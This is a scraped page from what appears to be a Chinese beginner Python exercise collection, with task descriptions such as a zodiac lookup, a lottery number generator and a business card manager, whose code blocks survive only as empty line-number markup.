<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 导演为剧本选主角</h2>
<p>输出确定参演剧本主角的名字。</p>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 模拟美团外面商家的套餐</h2>
<p>米线店套餐：考神套餐 13 元，单人套餐 9.9 元，情侣套餐 20 元，输出该米线点推出的套餐。</p>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 根据生日判断星座</h2>
<p>例如：生日为 7 月 1 日，属于巨蟹座。根据输入的出生月份和日期判断所属星座。</p>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 将美元转换为人民币</h2>
<p>按 1 美元等于 6.28 人民币计算。</p>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 修改手机默认语言</h2>
<p>编写手机类，采用无参数构造方法时，表示使用默认语言设计，利用有参数构造方法时，修改手机默认语言。</p>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 给信用卡设置默认密码</h2>
<p>创建信用卡类，并且为该类创建一个构造方法，该构造方法有三个参数，分别是：self、卡号和密码。密码设置一个默认值：123456，如果不指定密码采用默认密码，否则要重置密码。</p>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 打印每月销售明细</h2>
<p>输出进销存管理系统中的每月销售明细，运行程序，输入要查询的月份，如果输入的月份存在销售明细，则显示本月商品销售明细，如果输入的月份不存在或不是数字，则提示 “该月没有销售数据或输入的月份有误”。</p>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 模拟电影院的自动售票机选票页面</h2>
<p>模拟电影院自动售票机自动选择电影场次的页面，例如：一部电影在当日的播放时间有很多，可以自动选择合适的场次。</p>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 生成由数字、字母组成的 4 为验证码</h2>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 大乐透号码生成器</h2>
<p>使用 <code>Random</code> 模块，规则：前区在 1~35 的范围内随机产生不重复的 5 个号码，后区在 1~12 的范围内随机产生不重复的 2 个号码。</p>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 模拟春节集五福过程</h2>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 封装用户的上网行为</h2>
<p>对用户的上网时间进行统计，当上网时间过长，给出提升。</p>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 计算个人所得税</h2>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 根据当前时间创建文件</h2>
<p>在指定目录中，批量创建文件，文件名为 <code>%Y%m%d%H%M%S</code> 格式的当前时间（精确到秒）。</p>
<p>例如：创建文件的时间为 2022 年 11 月 17 日 11 点 5 分 10 秒，则该文件的文件名为 <code>20221171510.txt</code>。为了防止出现重名的文件，在每创建一个文件后，让线程休息一秒。</p>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 批量添加文件夹</h2>
<p>在指定的目录中，批量创建指定个数的文件夹。</p>
<details class="hint-container details"><summary>代码</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 基础综合项目【名片管理系统】</h2>
<ul>
<li>程序启动，显示名片管理系统欢迎界面，并显示功能菜单</li>
<li>用户用数字选择不同的功能</li>
<li>根据功能选择，执行不同的功能</li>
<li>用户名片需要记录用户的 姓名、电话、QQ、邮件</li>
<li>如果查询到指定的名片，用户可以选择 修改 或者 删除 名片</li>
</ul>
<details class="hint-container details"><summary>详情</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>
<h2> 快递地址信息按省分拣</h2>
<p>现有一堆快递地址信息，需对其进行按省分拣，以方便后续投递。</p>
<details class="hint-container details"><summary>详情</summary>
<div class="language-python line-numbers-mode" data-ext="py"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div 